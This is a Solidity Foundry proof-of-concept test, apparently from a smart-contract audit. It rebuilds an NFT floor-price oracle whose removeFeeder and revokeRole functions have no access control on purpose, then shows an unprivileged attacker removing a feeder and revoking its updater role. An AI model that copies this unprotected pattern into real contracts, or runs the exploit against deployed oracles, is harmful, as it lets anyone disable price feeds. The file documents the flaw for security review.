import "forge-std/Test.sol";

contract NFTFloorOracle {
    event FeederAdded(address indexed feeder);
    event FeederRemoved(address indexed feeder);

    bytes32 public constant UPDATER_ROLE = keccak256("UPDATER_ROLE");

    struct FeederPosition {
        bool registered;
        uint8 index;
    }

    address[] public feeders;
    mapping(address => FeederPosition) private feederPositionMap;
    mapping(bytes32 => mapping(address => bool)) internal _roles;

    function initialize(address[] memory _feeders) public {
        _addFeeders(_feeders);
    }

    modifier onlyWhenFeederExisted(address _feeder) {
        require(feederPositionMap[_feeder].registered, "NFTOracle: feeder not existed");
        _;
    }

    function removeFeeder(address _feeder) external onlyWhenFeederExisted(_feeder) {
        _removeFeeder(_feeder);
    }

    function _addFeeders(address[] memory _feeders) internal {
        for (uint256 i = 0; i < _feeders.length; i++) {
            _addFeeder(_feeders[i]);
        }
    }

    function _addFeeder(address _feeder) internal {
        feeders.push(_feeder);
        feederPositionMap[_feeder].index = uint8(feeders.length - 1);
        feederPositionMap[_feeder].registered = true;
        _setupRole(UPDATER_ROLE, _feeder);
        emit FeederAdded(_feeder);
    }

    function _removeFeeder(address _feeder) internal onlyWhenFeederExisted(_feeder) {
        uint8 feederIndex = feederPositionMap[_feeder].index;
        if (feederIndex >= 0 && feeders[feederIndex] == _feeder) {
            feeders[feederIndex] = feeders[feeders.length - 1];
            feeders.pop();
        }
        delete feederPositionMap[_feeder];
        revokeRole(UPDATER_ROLE, _feeder);
        emit FeederRemoved(_feeder);
    }

    /* Minimal AccessControl-like helpers used in the PoC */
    function _setupRole(bytes32 role, address account) internal {
        _roles[role][account] = true;
    }

    function revokeRole(bytes32 role, address account) public {
        _roles[role][account] = false;
    }

    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role][account];
    }

    /* Helper getters for the test */
    function isFeederRegistered(address _feeder) public view returns (bool) {
        return feederPositionMap[_feeder].registered;
    }

    function isUpdater(address _account) public view returns (bool) {
        return hasRole(UPDATER_ROLE, _account);
    }
}

contract NFTFloorOracleTest is Test {
    NFTFloorOracle target;
    address attacker;
    address feeder;

    function setUp() public {
        target = new NFTFloorOracle();
        feeder = makeAddr("feeder");
        address[] memory arr = new address[](1);
        arr[0] = feeder;
        target.initialize(arr);
        attacker = makeAddr("attacker");
        // sanity: feeder is registered and has updater role
        assertTrue(target.isFeederRegistered(feeder));
        assertTrue(target.isUpdater(feeder));
    }

    function test_attacker_exploits_removeFeeder() public {
        // attacker (no admin role) can call removeFeeder because the function lacks an access check
        vm.prank(attacker);
        target.removeFeeder(feeder);

        // feeder was removed and its UPDATER_ROLE revoked
        assertFalse(target.isFeederRegistered(feeder));
        assertFalse(target.isUpdater(feeder));
    }
}

